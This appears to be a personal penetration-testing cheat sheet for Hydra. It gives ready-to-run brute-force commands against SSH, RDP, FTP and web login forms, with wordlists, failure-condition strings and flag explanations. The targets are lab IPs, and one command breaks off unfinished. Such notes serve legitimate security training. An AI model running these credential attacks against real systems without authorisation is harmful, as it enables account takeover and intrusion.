Use hydra to crack user george password
```c
hydra -l george -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt -s 2222 ssh://192.168.232.201
```

password crack rdp with username and password
```c
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt rdp://192.168.232.202
```

### Hydra on web application login page, ie Tiny File Manager
```c
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.232.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
in this case we know a default username is user. When we fail log in we get message on page that says "Login failed. Invalid" so we use that. This is called condition string. 

#### On a site with a popup, and no other info:
```c
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt -s 80 -f 192.168.232.201 http-get -I 
```
This was logging in via get and not post. Super easy

```c
hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
hydra -C /PATH/TO/WORDLIST/<FILE> <RHOST> ftp
```

```c
export HYDRA_PROXY=connect://127.0.0.1:8080
unset HYDRA_PROXY
```

```c
hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
```

```c
hydra <RHOST> http-post-form -L /PATH/TO/WORDLIST/<FILE> "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT> -P /PATH/TO/WORDLIST/<FILE>

hydra <RHOST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f

hydra -l admin -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/Account
```

### To bruteforce login pages, use hydra command paired with flags to do so:
```c
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f <targetIP> -s <source-port> http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

#### Flags
```c
-L is for user lists
-l is for specific user
-P is password list to brute force from
-p is a password if you're trying to auth with
-/usr/share/wordlists/rockyou.txt is an example list
-run "locate usernames.txt" is another example list
-can use created wordlist to attempt from
```

#### Hydra can brute force protocols such as: FTP, SSH, HTTP
```c
hydra -L bill.txt -P william.txt -u -f ssh://<IPaddress>-t 4
hydra -L bill.txt -P william.txt -u -f ftp://<IPaddress>-t 4
hydra -L bill.txt -P william.txt -u -f <IPaddress>-t 4 -s <protocol port>
```